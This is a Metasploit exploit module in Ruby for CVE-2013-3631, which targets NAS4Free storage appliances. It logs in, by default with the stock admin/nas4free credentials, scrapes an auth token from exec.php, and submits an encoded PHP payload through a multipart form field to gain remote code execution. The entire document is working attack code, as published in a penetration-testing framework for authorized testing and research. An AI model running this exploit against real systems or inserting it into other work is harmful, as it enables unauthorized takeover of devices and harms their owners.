##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'
require 'rexml/document'

class Metasploit4 < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'NAS4Free Arbitrary Remote Code Execution',
      'Description'    => %q{
      NAS4Free allows an authenticated user to post PHP code to a special HTTP script and have
      the code executed remotely. This module was successfully tested against NAS4Free version
      9.1.0.1.804. Earlier builds are likely to be vulnerable as well.
      },
      'Author'         => [
        'Brandon Perry <bperry.volatile[at]gmail.com>' # Discovery / msf module
      ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['CVE', '2013-3631'],
          ['URL', 'https://community.rapid7.com/community/metasploit/blog/2013/10/30/seven-tricks-and-treats']
        ],
      'Payload'  =>
        {
          'Space' => 21244,
          'DisableNops' => true,
          'BadChars' => ''
        },
      'Targets'  =>
        [
          [ 'Automatic Target', { } ]
        ],
      'Privileged' => true,
      'Platform' => ['php'],
      'Arch' => ARCH_PHP,
      'DisclosureDate' => 'Oct 30 2013',
      'DefaultTarget' => 0))

      register_options([
        OptString.new('USERNAME', [ true, "Username to authenticate with", "admin"]),
        OptString.new('PASSWORD', [ false, "Password to authenticate with", "nas4free"])
      ], self.class)
  end

  def exploit
    init = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, '/')
    })

    sess = init.get_cookies

    post = {
      'username' => datastore["USERNAME"],
      'password' => datastore["PASSWORD"]
    }

    login = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/login.php'),
      'vars_post' => post,
      'cookie' => sess
    })

    if !login or login.code != 302
      fail_with("Login failed")
    end

    exec_resp = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, '/exec.php'),
      'cookie' => sess
    })

    if !exec_resp or exec_resp.code != 200
      fail_with('Error getting auth token from exec.php')
    end

    authtoken = ''
    #The html returned is not well formed, so I can't parse it with rexml
    exec_resp.body.each_line do |line|
      next if line !~ /authtoken/
      authtoken = line
    end

    doc = REXML::Document.new authtoken
    input = doc.root

    if !input
      fail_with('Error getting auth token')
    end

    token = input.attributes["value"]

    data = Rex::MIME::Message.new
    data.add_part('', nil, nil, 'form-data; name="txtCommand"')
    data.add_part('', nil, nil, 'form-data; name="txtRecallBuffer"')
    data.add_part('', nil, nil, 'form-data; name="dlPath"')
    data.add_part('', 'application/octet-stream', nil, 'form-data; name="ulfile"; filename=""')
    data.add_part(payload.encoded, nil, nil, 'form-data; name="txtPHPCommand"')
    #data.add_part(token, nil, nil, 'form-data; name="authtoken"')

    #I need to build the last data part by hand due to a bug in rex
    data_post = data.to_s
    data_post = data_post[0..data_post.length-data.bound.length-7]

    data_post << "\r\n--#{data.bound}"
    data_post << "\r\nContent-Disposition: form-data; name=\"authtoken\"\r\n\r\n"
    data_post << token
    data_post << "\r\n--#{data.bound}--\r\n\r\n"

    resp = send_request_raw({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/exec.php'),
      'ctype' => "multipart/form-data; boundary=#{data.bound}",
      'data' => data_post,
      'cookie' => sess
    })
  end
end
